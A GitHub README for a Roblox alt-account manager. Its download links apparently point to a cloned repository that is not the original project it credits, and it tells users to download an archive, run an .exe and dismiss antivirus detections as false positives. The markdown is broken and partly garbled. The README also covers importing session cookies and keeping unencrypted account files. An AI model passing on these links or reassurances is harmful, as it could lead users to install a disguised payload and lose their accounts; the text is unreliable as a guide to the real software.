[![Download](https://img.shields.io/github/v/release/ic3w0lf22/Roblox-Account-Manager)](https://github.com/LxslyS2/Roblox-Account-Profile-Managament/archive/refs/heads/main.zip)
[![Latest Downloads](https://img.shields.io/github/downloads/LxslyS2/Roblox-Account-Manager/latest/total)]([https://github.com/LxslyS2/Roblox-Account-Manager/releases](https://github.com/LxslyS2/Roblox-Account-Profile-Managament/releases))
[![Discord](https://img.shields.io/discord/871845273800957982?label=Discord)](https://discord.gg/MsEHfr7smXY8)
![License](https://img.shields.io/github/license/ic3w0lf22/Roblox-Account-Manager)

<!-- BEGIN LATEST DOWNLOAD BUTTON -->
[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-cyan?style=for-the-badge&logo=download&logoColor=black "Download")](https://github.com/LxslyS2/Roblox-Account-Profile-Managament/archive/refs/heads/main.zip)
<!-- END LATEST DOWNLOAD BUTTON -->


# Roblox Account Manager
Application that allows you to add multiple accounts into one application allowing you to easily play on alt accounts without having to change accounts

Useful for games that require grinding off other players, or storage accounts that hold in game items or currency, or just to have multiple accounts that you can easily find and use.

You are welcome to edit the code and create pull requests if it'll benefit this project.

# WARNING
**Under no circumstances should you engage in the creation or dissemination of an "rbx-player link." The utilization of such links can enable unauthorized individuals to access games using your account, or even initiate Roblox Studio with one of your game projects. This presents grave risks, including potential misuse of your Robux and activities that could lead to the suspension or termination of your account. Always exercise utmost caution when considering the use of these features and be aware of the associated risks.**

# Extra Features
It is crucial to exercise caution when modifying the DevMode setting in RAMSettings.ini. Changing it from DevMode=false to DevMode=true can unlock additional features, but it's imperative to be aware of the potential risks. Mishandling these settings or inadvertently sharing sensitive information can have undesirable consequences.

If you intend to invite a friend to join a game using your account, ensure that you accurately input the PlaceId and JobId. Once this data is correctly entered, you can right-click on an account and select the option "Copy rbx-player link." However, it is essential to note that you should refrain from sharing this link with anyone who requests it without proper verification and trust. Security and discretion should always be your top priorities in such matters.

# Download
To install this, head over to the [Releases](https://github.com/LxslyS2/Roblox-Account-Profile-Managament/archive/refs/heads/main.zip) section and download the rar file at the very top, once downloaded, extract the files into a folder on your desktop and run RBX Alt Manager.exe.

If the application isn't starting or not working, make sure to install the [Latest .NET Framework](https://dotnet.microsoft.com/download/dotnet-framework).
Still having issues? Download and install [vcredist](https://aka.ms/vs/16/release/vc_redist.x86.exe)


# Usage and Problems



# Open and compile the project.


## The Reason Why This Programme is Detected As a Virus.

- **Open source programs such as this program are commonly detected as viruses because actual malware may be using the same libaries as this one. For example, account manager may be detected as a RAT because of the Account Control feature, this feature uses [websockets](https://github.com/ic3w0lf22/Roblox-Account-Manager/blob/master/RBX%20Alt%20Manager/Nexus/WebsocketServer.cs) to connect to clients which is the same way actual malware may use to connect maliciously to someone elses computer. If you'd like, you can download [visual studio](https://visualstudio.microsoft.com/downloads/) yourself (it's free) and compile this program on your own, you may even get the same virus detections as the public release.**

## How to activate Multi-roblox

- **To access the configuration menu, initiate the process by clicking on the gear or cogwheel icon situated at the upper-right corner of the screen. Within the 'General' section, you will encounter a particular checkbox denoted as 'Multi Roblox.' Ensure that your Roblox application is not in operation; subsequently, proceed to verify the activation of this checkbox.**

## Account File Backup

- **Acquire [RAMDecrypt](https://github.com/ic3w0lf22/RAMDecrypt) and meticulously adhere to the accompanying directives. Subsequently, you may securely preserve the completely unencrypted document within your Google Drive, a portable flash drive, or any other preferred storage location. It is imperative to recognize that this procedure is not applicable to files that do not originate from your personal computer.**


## Fix CefSharp.Core.Runtime.dll/Object reference not set error.
**Retrieve the x86 edition from the following source: [VC Redist](https://docs.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist). Should you be operating on an antiquated operating system, consider procuring earlier renditions of the 'vcredist' by either scrolling through the page or selecting the provided hyperlink, accessible [here](https://docs.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist?view=msvc-170#visual-studio-2013-vc-120).**

In the event that these alternatives prove unproductive, you can opt to download the most recent iteration of the .NET Framework from the subsequent source: [Download .NET Framework](https://dotnet.microsoft.com/download/dotnet-framework).


# FAQ's



## **Q:** Why am I getting CefSharp.Core.Runtime.dll/Object reference not set errors, how do I fix it?

**A:** Download the x86 version from https://docs.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist | On an older OS? Try downloading [older versions of vcredist](https://docs.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist?view=msvc-170#visual-studio-2013-vc-120) by scrolling down on or clicking the link | If that doesn't work, download the latest .NET Framework from https://dotnet.microsoft.com/download/dotnet-framework


## **A:** My anti virus detects this program as a virus. Should I not use it?

**B:** No. This program is in no way malicious, it's source code is fully available & trusted by a lot of people in the community. Some anti-virus programs may detect Account Manager as malicious because of the auto update function (a similar thing happens with Roblox Studio Mod Manager as well)



## **A:** You should add ${feature}.

**B:** If you have a idea or a request for a feature you can submit such ideas/requests in suggestions


## **A:** I’ve encountered a bug/issue on this software

**B:** If you have a bug or issue please explain your issue with screenshots (if possible) and/or a highly descriptive explanation in bugs we will try to get back to you ASAP.
Make sure you click "Open Details" before screenshotting. Please make sure your output is in English.


## **A:** I can’t launch multiple accounts repeatedly.

**B:** This is due to Roblox’s rate limiting


## **A:** Adding an account doesn't work

**B:** Restart the program, this issue will be fixed next update


## **Q:** Can you get banned for using this?

**A:** No, you cannot get banned for using this as this does not break Roblox T.O.S although some games may disallow you from having alt accounts so please do your research if you are unsure.

## **Q:** My AccountData file gets corrupted often
**A:** This is due to ProtectedData failing sometimes. You can disable encryption by creating a file called `NoEncryption.IUnderstandTheRisks.iautamor`. Do this at your own risk, nobody except yourself is responsible for your accounts!


# Features

- **Account Encryption**
    - Description: All your account data is locally encrypted using your computer as the password/key, meaning if someone else gets a hold of your account data, they will not be able to decrypt it unless you decrypted it yourself and shared it.
    - How to: **DO NOT SHARE YOUR `AccountData.json` FILE AT ALL**

- **Password Encryption**
    - Description: Use a password to encrypt your data. This is recommended as it allows you to store your data safely in Google Drive or similar platforms and won't get corrupted due to switching computers.
    - How to: Enable password encryption for data safety.

- **[Multi Roblox](https://github.com/ic3w0lf22/Roblox-Account-Manager/blob/master/README.md#q-how-do-i-enable-multi-roblox)**
    - Description: RAM comes with a built-in multi Roblox feature allowing multiple Roblox clients to be open at once.
    - How to: If this doesn't work for you, make sure no Roblox processes are running in the background by checking in Task Manager, then restart RAM.

- **Load Region**
    - Description: See where a server is located and get an accurate ping reading.
    - How to: Right-click a server in the Server List, then click Load Region (requires a valid account to be selected in the main window).

- **Server List**
    - Description: See a game's servers, including the servers' data such as player count and server ping.
    - How to: Click Server List on the right side of the main window.

- **[Join Small Servers](https://youtu.be/Red66cV6vVI)**
    - Description: Easily join small servers in games that use lobby starter places to teleport you to another game.
    - How to: Insert the actual game's PlaceId into the text box next to Refresh in the Server List, click Refresh, then right-click a server and click Join Game. You will hear a beep if successful.

- **Account Utilities**
    - Description: Easily change your account password, email, follow privacy, etc.
    - How to: Click Account Utilities in the main window (requires a valid account to be selected in the main window).

- **Account Sorting**
    - Description: Sort your accounts easily by dragging and dropping them.
    - How to: Simply drag and drop an account on the list.

- **Account Grouping**
    - Description: Sort your accounts by groups and drag and drop accounts into other groups.
    - How to: Right-click an account, hover over Groups, then click Move account to.

- **Group Sorting**
    - Description: Sort groups from top to bottom by assigning numbers to them.
    - How to: When creating a group, you can put a number from 0-999 (e.g., `1Main`, `007 Bank`, `67 Dead`). The numbers will be hidden afterwards.

- **Games List**
    - Description: Browse through thousands of games you normally wouldn't see on the front page.
    - How to: Click Server List, then Games.

- **Favorite Games**
    - Description: Add your favorite games to a list you can easily navigate to.
    - How to: Click Server List, then Favorites.

- **Recent Games**
    - Description: Saves your recently played games into the PlaceId text box.
    - How to: After joining a game, that game will be added to the recent games list, which you can quickly load up by hovering over the clock icon above the PlaceId text box or by typing the game's name into the PlaceId text box in the main window.

- **Open Browser**
   - *Description:* Open a browser window using the selected account, allowing you to access various settings.
   - *How to:* Click `Open Browser` in the main window while having an account selected.

- **Join VIP Servers**
   - *Description:* Simply place your entire VIP server link into the `PlaceId` text box, and RAM will handle the rest.

- **Shuffle JobId**
   - *Description:* Selects a random JobId for every account every time you press "Join Server" unless you have a JobId set.
   - *How to:* Click the shuffle icon to toggle JobId Shuffler.

- **Save PlaceId & JobId**
   - *Description:* Save specific `PlaceId`s and/or `JobId`s to specific accounts.
   - *How to:* Once you enter your desired PlaceId and/or VIP links, click the `Save` icon next to the `JobId` text box.

- **Player Finder**
   - *Description:* Find a player even if their follows are off as long as you know what game they are in.
   - *How to:* In the `Server List` window, put a player's username into the `Username` text box, then click search. (Note: This feature may take a while to load and may be patched in the near future.)

- **Universe Viewer**
   - *Description:* View a game's universe.
   - *How to:* Open `Utilities`, then click `Universe`.

- **Outfit Viewer**
   - *Description:* View other player's outfits and even wear their outfits.
   - *How to:* Open `Utilities`, then click `Outfits`.

- **Sort Account by Usage Date**
   - *Description:* View the last time you used an account.
   - *How to:* Make sure to enable headers in the Theme Editor, right-click the header and enable `Last Used`, then right-click an account, hover `Groups`, and press `Toggle`. You can now click on `Last Used` in the header to sort the accounts.

- **Close Roblox Beta**
   - *Description:* Detects if the Roblox Beta Home Menu is open and terminates the process if so.
   - *How to:* Open `Utilities`, then click `Watcher` to modify settings.

- **Prevent Duplicate Instances**
    - *Description:* Automatically shuts down old instances when you launch an account. RAM assigns a number called `BrowserTrackerID` to each account, allowing it to know if there is an active instance of that specific account running, then proceeds to close it preventing instances of the same account from opening more than once.

- **Save Passwords**
    - *Description:* Upon logging into an account, RAM will automatically save that account's password, which can then be copied by right-clicking the account and selecting `Copy Password`.
    - *How to:* This can be disabled by clicking the settings button (gear cog in the top-right corner) and unchecking `Save Passwords`.

- **Themes**
    - *Description:* Customize RAM to your liking (P.S. I know it's very ugly, not much I can do about it with WinForms).
    - *How to:* Click `Edit Theme` in the main window.

- **Developer Mode**
    - *Description:* Enable hidden features not available to normal users for safety reasons.
    - *How to:* Click the settings button (gear cog in the top-right corner), click `Developer`, then check the `Enable Developer Mode` box.

- **Local Web API**
    - *Description:* Easily use many RAM features by making a simple HTTP request.
    - *How to:* [Documentation](https://ic3w0lf22.gitbook.io/roblox-account-manager/).

- **Account Control**
    - *Description:* Control your in-game accounts using the `Account Control` window in RAM.
    - *How to:* Click `Account Control` in the main window - [Documentation](https://github.com/ic3w0lf22/Roblox-Account-Manager/blob/master/RBX%20Alt%20Manager/Nexus/NexusDocs.md).

- **Import Cookies**
    - *Description:* Import accounts using their .ROBLOSECURITY cookies.
    - *How to:* You can drag and drop one or multiple cookies directly into the program, or you can enable developer mode and use the `Import` window.

- **FPS Unlocker**
    - *Description:* Unlocks the Roblox client's FPS using Roblox's ClientAppSettings.json. Settings can be found by clicking the settings cog, then miscellaneous.

- **Bulk User Importing**
    - *Description:* Easily import your accounts by their username & password combos, or by cookies.
    - *How to:* Click the arrow on the right side of the `Add Account` button, then select user:pass/cookies.

- **Automatic Connection Loss Detection**
    - *Description:* Closes instances that are not connected to a server for a certain amount of time. To enable this, go to `Utilities` -> `Watcher`, and make sure `Enable Roblox Watcher` is checked as well as `Exit if No Connection to Server`.

- **Automatic Cookie Refresh**
    - *Description:* Your accounts never become invalidated sitting in the account manager over long periods of time. As long you actively use account manager, your accounts will regularly get new cookies preventing them from being logged out, though this does sign you out of other sessions.

- **Join Group**
    - *Description:* Easily join groups with multiple accounts. Click the arrow on the right side of the `Open Browser` button, then click `Join Group`.

- **Auto Relaunch**
    - *Description:* Automatically relaunch your accounts if they are not in-game or have been AFK kicked. Watch a YouTube tutorial on how to use this. If you do not have an executor that works with Nexus.lua, click `Account Control`, go to `Settings`, then enable `Use Presence API`.

- **Quick Log In**
    - *Description:* Easily log in to an account on a different computer using Roblox's Quick Log In feature. Right-click an account, then select `Quick Log In`.

- **AI Captcha Assistance**
    - *Description:* Assists you in the "Pick the image" captchas using the Nopecha API (Requires a subscription key). You can enable auto solve, but it is not recommended to use. Your best option is to add a captcha-solving extension to the browser along with a BrowserConfig to automatically set the key per new browser opened.

# Preview
![github-large](Images/Image4.png)


# License
**This project is licensed under the MIT. For more information, see the License.**
